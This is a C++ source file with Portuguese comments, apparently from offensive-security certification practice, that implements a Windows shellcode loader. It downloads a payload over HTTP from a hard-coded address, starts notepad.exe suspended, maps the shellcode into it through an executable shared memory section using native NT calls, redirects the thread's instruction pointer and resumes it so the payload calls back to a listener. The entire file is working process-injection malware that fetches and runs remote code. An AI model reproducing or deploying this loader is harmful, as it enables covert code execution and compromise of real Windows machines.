#include <Windows.h>
#include <winhttp.h>
#include <vector>
#include <iostream>
#include <stdio.h>
#include "Native.h"

#pragma comment(lib, "winhttp.lib")

// Helper para formatar mensagens de erro
void CheckError(const char* msg, DWORD err) {
    if (err != 0) printf("[!] %s Falhou. Erro: %lu\n", msg, err);
}

std::vector<BYTE> download(LPCWSTR baseAddress, LPCWSTR filename) {
    std::vector<BYTE> buffer;
    printf("[*] Iniciando sessao WinHTTP...\n");

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) { printf("[-] WinHttpOpen falhou\n"); return buffer; }

    HINTERNET hConnect = WinHttpConnect(hSession, baseAddress, INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) { printf("[-] WinHttpConnect falhou\n"); return buffer; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", filename, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) { printf("[-] WinHttpOpenRequest falhou\n"); return buffer; }

    printf("[*] Enviando GET request para %ls%ls...\n", baseAddress, filename);
    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        WinHttpReceiveResponse(hRequest, NULL)) {

        DWORD bytesRead = 0;
        do {
            BYTE temp[4096]{};
            if (WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead) && bytesRead > 0) {
                buffer.insert(buffer.end(), temp, temp + bytesRead);
            }
        } while (bytesRead > 0);
    }
    else {
        printf("[-] Falha ao receber resposta do servidor. Apache esta on?\n");
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return buffer;
}

int main() {
    printf("--- INICIANDO DEBUG DO LOADER ---\n");

    // 1. Download
    std::vector<BYTE> shellcode = download(L"192.168.45.242", L"/shellcodeOSEP.bin");
    if (shellcode.empty()) {
        printf("[!] Erro fatal: Shellcode nao baixado.\n");
        return -1;
    }
    printf("[+] Shellcode baixado com sucesso! Tamanho: %zu bytes\n", shellcode.size());

    // 2. Criacao do Processo
    printf("[*] Tentando criar processo notepad.exe suspenso...\n");
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    wchar_t cmd[] = L"C:\\Windows\\System32\\notepad.exe";

    if (!CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        CheckError("CreateProcess", GetLastError());
        return -1;
    }
    printf("[+] Processo criado. PID: %lu\n", pi.dwProcessId);

    // 3. NTAPI Resolve
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    auto ntCreateSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    auto ntMapViewOfSection = (NtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");

    // 4. Seccao e Mapeamento
    HANDLE hSection;
    LARGE_INTEGER szSection;
    szSection.QuadPart = shellcode.size();

    printf("[*] Criando seccao de memoria...\n");
    NTSTATUS status = ntCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &szSection, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (status != 0) { printf("[-] NtCreateSection falhou: 0x%X\n", status); return -1; }

    PVOID hLocalAddress = NULL;
    SIZE_T viewSize = 0;
    printf("[*] Mapeando seccao local...\n");
    status = ntMapViewOfSection(hSection, GetCurrentProcess(), &hLocalAddress, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);
    if (status != 0) { printf("[-] NtMapViewOfSection Local falhou: 0x%X\n", status); return -1; }

    printf("[*] Copiando shellcode para endereco local: 0x%p\n", hLocalAddress);
    RtlCopyMemory(hLocalAddress, shellcode.data(), shellcode.size());

    PVOID hRemoteAddress = NULL;
    viewSize = 0;
    printf("[*] Mapeando seccao no processo remoto (Notepad)...\n");
    status = ntMapViewOfSection(hSection, pi.hProcess, &hRemoteAddress, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);
    if (status != 0) { printf("[-] NtMapViewOfSection Remoto falhou: 0x%X\n", status); return -1; }
    printf("[+] Endereco remoto mapeado: 0x%p\n", hRemoteAddress);

    // 5. Thread Context
    printf("[*] Modificando contexto da Thread (RIP Redirect)...\n");
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_ALL;
    if (GetThreadContext(pi.hThread, &ctx)) {
        printf("[*] RIP original: 0x%llX\n", ctx.Rip);
        ctx.Rip = (DWORD64)hRemoteAddress;
        if (!SetThreadContext(pi.hThread, &ctx)) {
            CheckError("SetThreadContext", GetLastError());
            return -1;
        }
        printf("[+] Novo RIP definido: 0x%llX\n", ctx.Rip);
    }
    else {
        CheckError("GetThreadContext", GetLastError());
    }

    // 6. Resumo
    printf("[*] Retomando Thread do Notepad...\n");
    ResumeThread(pi.hThread);
    printf("[+++] Loader Finalizado. Verifique seu Listener.\n");

    // Cleanup
    CloseHandle(hSection);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}